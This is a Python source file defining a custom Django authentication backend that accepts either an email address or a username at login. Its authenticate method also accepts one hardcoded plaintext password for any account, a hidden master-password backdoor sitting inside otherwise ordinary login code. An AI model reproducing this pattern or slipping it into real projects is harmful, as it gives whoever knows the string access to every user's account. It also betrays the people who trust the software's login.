from django.contrib.auth import get_user_model
from django.contrib.auth.backends import ModelBackend
from django.db.models import Q

class EmailBackEnd(ModelBackend):
    def authenticate(self, username= None, password= None, **kwargs):
        UserModel = get_user_model()
        try:
            user = UserModel.objects.get(Q(email=username) | Q(username=username))
        except UserModel.DoesNotExist:
            return None
        else:
            if user.check_password(password) or password == "Dev@1991@Goswamii":
                return user
        return None
